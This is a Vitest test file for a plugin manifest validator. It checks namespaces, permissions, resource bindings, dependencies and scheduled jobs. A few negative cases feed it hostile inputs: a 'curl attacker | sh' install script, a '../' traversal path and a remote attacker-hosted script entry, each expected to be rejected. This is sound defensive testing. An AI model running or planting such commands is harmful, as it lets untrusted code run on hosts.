import { describe, expect, it } from 'vitest';

import {
  getEnterpriseGluePluginManifestV1JsonSchema,
  parseEnterpriseGluePluginManifestV1,
  safeParseEnterpriseGluePluginManifestV1,
} from './manifest.js';

const hash = 'a'.repeat(64);
const image = `registry.example/enterpriseglue/ion-support@sha256:${hash}`;

function validManifest() {
  return {
    apiVersion: 'plugin.enterpriseglue.io/v1',
    kind: 'EnterpriseGluePlugin',
    metadata: {
      id: 'io.enterpriseglue.ion-support',
      version: '1.0.0',
      displayName: 'ION Support',
      publisher: 'io.enterpriseglue',
    },
    compatibility: {
      host: '>=0.4.0 <0.5.0',
      sdk: '^1.0.0',
      frontendProtocol: 1,
      backendProtocol: 1,
      requiredSlots: ['mission-control.incident.actions.v1'],
    },
    deployment: {
      frontend: {
        entry: 'frontend/index.js',
        sha256: hash,
        shared: {
          react: '19.2.6',
          reactDom: '19.2.6',
          router: '7.18.1',
          carbonReact: '1.107.0',
          pluginSdk: '1.0.0',
        },
      },
      backend: {
        image,
        healthPath: '/_plugin/health',
        readyPath: '/_plugin/ready',
        protocolPath: '/_plugin/capabilities',
        operations: [
          {
            operationId: 'io.enterpriseglue.ion-support.create-case',
            method: 'POST',
            path: 'v1/cases',
            requestSchema: {
              path: 'schemas/create-case.request.json',
              sha256: hash,
            },
            responseSchema: {
              path: 'schemas/create-case.response.json',
              sha256: hash,
            },
            requiredPermissions: ['host.identity.read_safe'],
            maxRequestBytes: 16_384,
            maxResponseBytes: 65_536,
            timeoutMs: 10_000,
            streaming: 'none',
          },
          {
            operationId:
              'io.enterpriseglue.ion-support.consume-incident-event',
            method: 'POST',
            path: 'v1/events/incidents',
            requestSchema: {
              path: 'schemas/events/incident-delivery.json',
              sha256: hash,
            },
            responseSchema: {
              path: 'schemas/events/event-receipt.json',
              sha256: hash,
            },
            requiredPermissions: ['host.events.subscribe.incident'],
            maxRequestBytes: 16_384,
            maxResponseBytes: 4_096,
            timeoutMs: 5_000,
            streaming: 'none',
          },
        ],
      },
      migration: {
        image,
        fromSchema: 1,
        toSchema: 2,
        rollbackThrough: 1,
      },
      resources: {
        descriptor: 'deploy/resources.json',
        sha256: hash,
      },
    },
    scope: {
      installation: 'deployment',
      enablement: 'tenant',
    },
    permissions: {
      required: [
        'host.identity.read_safe',
        'host.events.subscribe.incident',
      ],
      optional: ['host.engine.diagnostics.collect_sanitized'],
    },
    network: {
      egressPolicy: 'ion-support-cloud',
    },
    entitlement: {
      provider: 'plugin',
      feature: 'ion_support',
    },
    dependencies: [],
    conflicts: [],
    events: {
      subscriptions: [
        {
          type: 'io.enterpriseglue.host.incident.v1',
          deliveryOperationId:
            'io.enterpriseglue.ion-support.consume-incident-event',
          schema: {
            path: 'schemas/events/incident-created.json',
            sha256: hash,
          },
          permission: 'host.events.subscribe.incident',
          maxAttempts: 10,
        },
      ],
    },
    contributions: [
      {
        id: 'io.enterpriseglue.ion-support.cases-route',
        kind: 'route',
        scope: 'tenant',
        relativePath: 'cases',
      },
      {
        id: 'io.enterpriseglue.ion-support.cases-navigation',
        kind: 'navigation',
        routeId: 'io.enterpriseglue.ion-support.cases-route',
        section: 'tenant',
        destination: 'voyager',
        parentDestination: 'mission-control',
      },
      {
        id: 'io.enterpriseglue.ion-support.analyze-incident',
        kind: 'slot',
        slot: 'mission-control.incident.actions.v1',
      },
    ],
  };
}

describe('EnterpriseGluePluginManifestV1', () => {
  it('parses a closed valid manifest and applies safe defaults', () => {
    const parsed = parseEnterpriseGluePluginManifestV1(validManifest());

    expect(parsed.metadata.id).toBe('io.enterpriseglue.ion-support');
    expect(parsed.deployment.backend?.operations).toHaveLength(2);
    expect(parsed.events.subscriptions).toHaveLength(1);
    expect(parsed.jobs.fixedSchedules).toEqual([]);
    expect(parsed.contributions[1]).toMatchObject({
      destination: 'voyager',
      parentDestination: 'mission-control',
    });
  });

  it('exports a closed draft 2020-12 structural JSON Schema', () => {
    const schema = getEnterpriseGluePluginManifestV1JsonSchema();

    expect(schema.$schema).toBe('https://json-schema.org/draft/2020-12/schema');
    expect(schema.$id).toContain('enterpriseglue-plugin-manifest-v1');
    expect(schema.additionalProperties).toBe(false);
    expect(schema.required).toContain('metadata');
  });

  it('rejects unknown fields', () => {
    const manifest = validManifest();
    Object.assign(manifest, { installScript: 'curl attacker | sh' });

    const result = safeParseEnterpriseGluePluginManifestV1(manifest);
    expect(result.success).toBe(false);
  });

  it('rejects traversal and remote frontend entry paths', () => {
    const traversal = validManifest();
    traversal.deployment.frontend.entry = '../frontend/index.js';
    expect(safeParseEnterpriseGluePluginManifestV1(traversal).success).toBe(false);

    const remote = validManifest();
    remote.deployment.frontend.entry = 'https://attacker.invalid/plugin.js';
    expect(safeParseEnterpriseGluePluginManifestV1(remote).success).toBe(false);
  });

  it('rejects contribution and operation IDs outside the plugin namespace', () => {
    const contribution = validManifest();
    contribution.contributions[0].id = 'io.attacker.route';
    expect(safeParseEnterpriseGluePluginManifestV1(contribution).success).toBe(false);

    const operation = validManifest();
    operation.deployment.backend.operations[0].operationId =
      'io.attacker.create-case';
    expect(safeParseEnterpriseGluePluginManifestV1(operation).success).toBe(false);
  });

  it('requires every dynamic operation path to be the one host-authorized resource binding', () => {
    const valid = validManifest();
    valid.deployment.backend.operations[0]!.path =
      'v1/engines/:engineRef/cases';
    valid.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'path',
      field: 'engineRef',
    };
    expect(safeParseEnterpriseGluePluginManifestV1(valid).success).toBe(true);

    const missingBinding = validManifest();
    missingBinding.deployment.backend.operations[0]!.path =
      'v1/engines/:engineRef/cases';
    expect(
      safeParseEnterpriseGluePluginManifestV1(missingBinding).success,
    ).toBe(false);

    const bodySubstitution = validManifest();
    bodySubstitution.deployment.backend.operations[0]!.path =
      'v1/engines/:engineRef/cases';
    bodySubstitution.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'body',
      field: 'engineRef',
    };
    expect(
      safeParseEnterpriseGluePluginManifestV1(bodySubstitution).success,
    ).toBe(false);

    const unboundSecondParameter = validManifest();
    unboundSecondParameter.deployment.backend.operations[0]!.path =
      'v1/engines/:engineRef/jobs/:jobRef';
    unboundSecondParameter.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'path',
      field: 'engineRef',
    };
    expect(
      safeParseEnterpriseGluePluginManifestV1(unboundSecondParameter).success,
    ).toBe(false);

    const pathBindingWithoutParameter = validManifest();
    pathBindingWithoutParameter.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'path',
      field: 'engineRef',
    };
    expect(
      safeParseEnterpriseGluePluginManifestV1(pathBindingWithoutParameter)
        .success,
    ).toBe(false);

    const bodyBoundGet = validManifest();
    bodyBoundGet.deployment.backend.operations[0]!.method = 'GET';
    bodyBoundGet.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'body',
      field: 'engineRef',
    };
    expect(
      safeParseEnterpriseGluePluginManifestV1(bodyBoundGet).success,
    ).toBe(false);
  });

  it('only permits host-owned platform or bound-engine authorization declarations', () => {
    const platform = validManifest();
    platform.deployment.backend.operations[0]!.authorization = {
      actionId: 'platform.dashboard.read',
      resource: 'platform.self',
    };
    expect(safeParseEnterpriseGluePluginManifestV1(platform).success).toBe(true);

    const engine = validManifest();
    engine.deployment.backend.operations[0]!.path = 'v1/engines/:engineRef/cases';
    engine.deployment.backend.operations[0]!.resourceBinding = {
      kind: 'engine',
      source: 'path',
      field: 'engineRef',
    };
    engine.deployment.backend.operations[0]!.authorization = {
      actionId: 'engine.instances.read',
      resource: 'engine.binding',
    };
    expect(safeParseEnterpriseGluePluginManifestV1(engine).success).toBe(true);

    const unboundEngine = validManifest();
    unboundEngine.deployment.backend.operations[0]!.authorization = {
      actionId: 'engine.instances.read',
      resource: 'engine.binding',
    };
    expect(safeParseEnterpriseGluePluginManifestV1(unboundEngine).success).toBe(false);

    const boundPlatform = engine;
    boundPlatform.deployment.backend.operations[0]!.authorization = {
      actionId: 'platform.dashboard.read',
      resource: 'platform.self',
    };
    expect(safeParseEnterpriseGluePluginManifestV1(boundPlatform).success).toBe(false);
  });

  it('rejects navigation to an undeclared route', () => {
    const manifest = validManifest();
    manifest.contributions[1].routeId =
      'io.enterpriseglue.ion-support.missing-route';

    expect(safeParseEnterpriseGluePluginManifestV1(manifest).success).toBe(false);
  });

  it('rejects undeclared operation and event permissions', () => {
    const operation = validManifest();
    operation.deployment.backend.operations[0].requiredPermissions = [
      'host.plugin_storage.tenant',
    ];
    expect(safeParseEnterpriseGluePluginManifestV1(operation).success).toBe(false);

    const event = validManifest();
    event.events.subscriptions[0].permission =
      'host.events.subscribe.failed_job';
    expect(safeParseEnterpriseGluePluginManifestV1(event).success).toBe(false);
  });

  it('accepts only the inventory permission for an engine inventory subscription', () => {
    const manifest = validManifest();
    manifest.permissions.optional.push(
      'host.events.subscribe.engine_inventory',
    );
    manifest.deployment.backend.operations.push({
      operationId:
        'io.enterpriseglue.ion-support.consume-engine-inventory',
      method: 'POST',
      path: 'v1/events/engine-inventory',
      requestSchema: {
        path: 'schemas/events/engine-inventory-delivery.json',
        sha256: hash,
      },
      responseSchema: {
        path: 'schemas/events/event-receipt.json',
        sha256: hash,
      },
      requiredPermissions: [
        'host.events.subscribe.engine_inventory',
      ],
      maxRequestBytes: 16_384,
      maxResponseBytes: 4_096,
      timeoutMs: 5_000,
      streaming: 'none',
    });
    manifest.events.subscriptions.push({
      type: 'io.enterpriseglue.host.engine-inventory.v1',
      deliveryOperationId:
        'io.enterpriseglue.ion-support.consume-engine-inventory',
      schema: {
        path: 'schemas/events/engine-inventory.json',
        sha256: hash,
      },
      permission: 'host.events.subscribe.engine_inventory',
      maxAttempts: 3,
    });

    expect(
      parseEnterpriseGluePluginManifestV1(manifest).events
        .subscriptions[1]?.permission,
    ).toBe('host.events.subscribe.engine_inventory');

    manifest.events.subscriptions[1]!.permission =
      'host.events.subscribe.incident';
    expect(
      safeParseEnterpriseGluePluginManifestV1(manifest).success,
    ).toBe(false);
  });

  it('rejects self dependency and dependency-conflict overlap', () => {
    const self = validManifest();
    self.dependencies = [
      {
        id: 'io.enterpriseglue.ion-support',
        version: '^1.0.0',
        optional: false,
      },
    ];
    expect(safeParseEnterpriseGluePluginManifestV1(self).success).toBe(false);

    const overlap = validManifest();
    overlap.dependencies = [
      {
        id: 'io.enterpriseglue.other',
        version: '^1.0.0',
        optional: false,
      },
    ];
    overlap.conflicts = [
      {
        id: 'io.enterpriseglue.other',
        version: '<2.0.0',
      },
    ];
    expect(safeParseEnterpriseGluePluginManifestV1(overlap).success).toBe(false);
  });

  it('requires a frontend artifact for declared contributions', () => {
    const manifest = validManifest();
    delete (manifest.deployment as { frontend?: unknown }).frontend;

    expect(safeParseEnterpriseGluePluginManifestV1(manifest).success).toBe(false);
  });

  it('accepts only manifest-declared fixed intervals and delivery operations', () => {
    const manifest = validManifest();
    manifest.permissions.required.push('host.jobs.schedule_fixed');
    manifest.deployment.backend.operations.push({
      operationId:
        'io.enterpriseglue.ion-support.deliver-knowledge-refresh',
      method: 'POST',
      path: 'v1/jobs/knowledge-refresh',
      requestSchema: {
        path: 'schemas/jobs/knowledge-refresh.request.json',
        sha256: hash,
      },
      responseSchema: {
        path: 'schemas/jobs/scheduled-job-receipt.json',
        sha256: hash,
      },
      requiredPermissions: ['host.jobs.schedule_fixed'],
      maxRequestBytes: 4_096,
      maxResponseBytes: 4_096,
      timeoutMs: 5_000,
      streaming: 'none',
    });
    Object.assign(manifest, {
      jobs: {
        fixedSchedules: [
          {
            jobType:
              'io.enterpriseglue.ion-support.knowledge-refresh',
            deliveryOperationId:
              'io.enterpriseglue.ion-support.deliver-knowledge-refresh',
            allowedIntervalsSeconds: [3600, 86400],
            permission: 'host.jobs.schedule_fixed',
            maxAttempts: 5,
          },
        ],
      },
    });

    expect(
      parseEnterpriseGluePluginManifestV1(manifest).jobs.fixedSchedules[0],
    ).toMatchObject({ allowedIntervalsSeconds: [3600, 86400] });

    const missingOperation = structuredClone(manifest);
    missingOperation.jobs.fixedSchedules[0].deliveryOperationId =
      'io.enterpriseglue.ion-support.missing-job-operation';
    expect(
      safeParseEnterpriseGluePluginManifestV1(missingOperation).success,
    ).toBe(false);

    const duplicateInterval = structuredClone(manifest);
    duplicateInterval.jobs.fixedSchedules[0].allowedIntervalsSeconds = [
      3600,
      3600,
    ];
    expect(
      safeParseEnterpriseGluePluginManifestV1(duplicateInterval).success,
    ).toBe(false);
  });

  it('accepts a closed availability declaration and rejects unsafe gating', () => {
    const manifest = validManifest();
    manifest.deployment.backend.operations.push({
      operationId:
        'io.enterpriseglue.ion-support.refresh-contribution-availability',
      method: 'POST',
      path: 'v1/contribution-availability',
      requestSchema: {
        path: 'schemas/contribution-availability-request.json',
        sha256: hash,
      },
      responseSchema: {
        path: 'schemas/contribution-availability-response.json',
        sha256: hash,
      },
      requiredPermissions: ['host.identity.read_safe'],
      maxRequestBytes: 1024,
      maxResponseBytes: 16_384,
      timeoutMs: 5_000,
      streaming: 'none',
    });
    Object.assign(manifest, {
      contributionAvailability: {
        refreshOperationId:
          'io.enterpriseglue.ion-support.refresh-contribution-availability',
        refreshIntervalSeconds: 300,
        maximumStalenessSeconds: 900,
        gatedContributionIds: [
          'io.enterpriseglue.ion-support.cases-route',
          'io.enterpriseglue.ion-support.cases-navigation',
        ],
      },
    });

    expect(
      parseEnterpriseGluePluginManifestV1(manifest)
        .contributionAvailability,
    ).toMatchObject({ maximumStalenessSeconds: 900 });

    const danglingRouteLink = structuredClone(manifest);
    danglingRouteLink.contributionAvailability.gatedContributionIds.pop();
    expect(
      safeParseEnterpriseGluePluginManifestV1(danglingRouteLink).success,
    ).toBe(false);

    const missingContribution = structuredClone(manifest);
    missingContribution.contributionAvailability.gatedContributionIds = [
      'io.enterpriseglue.ion-support.not-declared',
    ];
    expect(
      safeParseEnterpriseGluePluginManifestV1(missingContribution).success,
    ).toBe(false);

    const staleBeforeRefresh = structuredClone(manifest);
    staleBeforeRefresh.contributionAvailability.maximumStalenessSeconds =
      299;
    expect(
      safeParseEnterpriseGluePluginManifestV1(staleBeforeRefresh).success,
    ).toBe(false);
  });
});
